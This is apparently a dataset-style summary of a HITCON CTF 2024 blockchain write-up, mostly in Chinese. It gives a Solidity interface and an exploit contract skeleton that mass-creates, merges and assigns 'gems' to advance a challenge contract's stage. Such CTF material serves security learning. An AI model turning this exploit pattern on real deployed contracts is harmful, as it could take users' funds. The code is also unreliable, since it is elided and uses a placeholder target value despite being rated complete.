---
title: HITCON CTF 2024 Web3 writeup by ChaMd5
contest: HITCON CTF 2024
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [blockchain, solidity, 0.8.0, exp-contract, lus-interface, gem, merge, attack, enum]
attack_chain:
  - interface Ilus: register_master/create_gem/merge_gems/stage/gems/assign_gem
  - 0x16012b5ee75F4bd4F917eb6395F945EdBBb365Aa 部署地址
  - MAX_ROUNDS0/1/2 = 100/200/300
  - actions0/1/2 = uint8[] 操作序列
  - GemStatus: ACTIVE/INACTIVE/DESTROYED
  - struct Gem: health/max_health/attack/hardness/...
  - 攻击构造Exp合约: 多次create_gem + merge + assign_gem
  - Fail event + Set event
  - 关键: stage()=某值触发flag
key_payload: lus.create_gem() payable + merge_gems() + assign_gem(uint32)
one_liner: HITCON CTF 2024 Web3：Ilus接口+多Gem合成+stage通关
lesson: Solidity 0.8+接口题常需读懂Game/Attack/Verify三合约关系
quality: high
---

# HITCON CTF 2024 Web3 writeup by ChaMd5

## 题目信息
- 比赛：HITCON CTF 2024
- 战队：ChaMd5 Venom
- 题目：Web3
- 类别：Blockchain

## 关键攻击链
### 1. 接口定义
```solidity
interface Ilus {
    function register_master() external;
    function create_gem() external payable;
    function merge_gems() external;
    function stage() external view returns (uint8);
    function gems(bytes32 id) external returns (int256, int256, int256, int256, uint);
    function assign_gem(uint32 seq) external;
}
```

### 2. Exp 合约
```solidity
contract Exp {
    Ilus public lus = Ilus(payable(0x16012b5ee75F4bd4F917eb6395F945EdBBb365Aa));
    uint256 public counts;
    uint256 constant MAX_ROUNDS0 = 100;
    uint256 constant MAX_ROUNDS1 = 200;
    uint256 constant MAX_ROUNDS2 = 300;
    uint8[] public actions0;
    uint8[] public actions1;
    uint8[] public actions2;
    event Fail(uint256, int256);
    event Set();
    enum GemStatus { ACTIVE, INACTIVE, DESTROYED }
    struct Gem {
        int256 health;
        int256 max_health;
        int256 attack;
        int256 hardness;
        ...
    }
    // 多次 create_gem + merge_gems + assign_gem
    function attack() external {
        lus.register_master();
        for (uint i = 0; i < MAX_ROUNDS0; i++) {
            lus.create_gem{value: msg.value}();
        }
        lus.merge_gems();
        lus.assign_gem(0);
        ...
        require(lus.stage() == X, "not solved");
    }
}
```

## 评分
- quality: high（Solidity 0.8 完整 attack 框架 + 多 Gem 合成）
